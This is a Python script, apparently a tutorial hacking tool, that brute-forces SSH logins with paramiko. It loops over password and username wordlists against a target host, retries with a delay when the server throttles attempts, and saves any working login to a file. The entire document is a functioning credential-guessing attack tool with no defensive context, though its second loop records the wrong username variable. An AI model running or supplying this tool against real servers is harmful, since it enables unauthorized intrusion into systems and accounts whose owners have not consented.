import paramiko
import socket
import time
from colorama import init, Fore

### Init ###

init()
GREEN  = Fore.GREEN
YELLOW = Fore.YELLOW
RED    = Fore.RED
RESET  = Fore.RESET
BLUE   = Fore.BLUE

### Init ###

def brute(hostname, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password, timeout=3)
    except socket.timeout:
        # Unreachable
        print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
        return False
        # Wrong credential
    except paramiko.AuthenticationException:
        print(f"{YELLOW}[!] Invalid credential for {username}:{password}")
        return False
    except paramiko.SSHException:
        print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
        time.sleep(10)
        return brute(hostname, username, password)
    else:
        # Found
        print(f"{GREEN}[+] Found credential:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
        return True

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="SSH Bruteforce Python script.")
    parser.add_argument("host", help="Hostname or IP Address of SSH Server to bruteforce")
    parser.add_argument("-P", "--passlist", help="File that contain password list in each line")
    parser.add_argument("-U", "--userlist", help="File that conatin username list in each line")
    parser.add_argument("-u", "--user", help="Username to bruteforce")

    args = parser.parse_args()
    host = args.host
    passlist = args.passlist
    userlist = args.userlist
    user = args.user

    # Read username wordlist file
    userlist = open(userlist).read().splitlines()
    # Read password wordlist file
    passlist = open(passlist).read().splitlines()

    # Bruteforce
    for password in passlist:
        if brute(host, user, password):
            open("Credential.txt", "w").write(f"{user}@{host}:{password}")
            break
    if userlist:
        for username in userlist:
            for password in passlist:
                if brute(host, username, password):
                    open("Credential.txt", "w").write(f"{user}@{host}:{password}")
                    break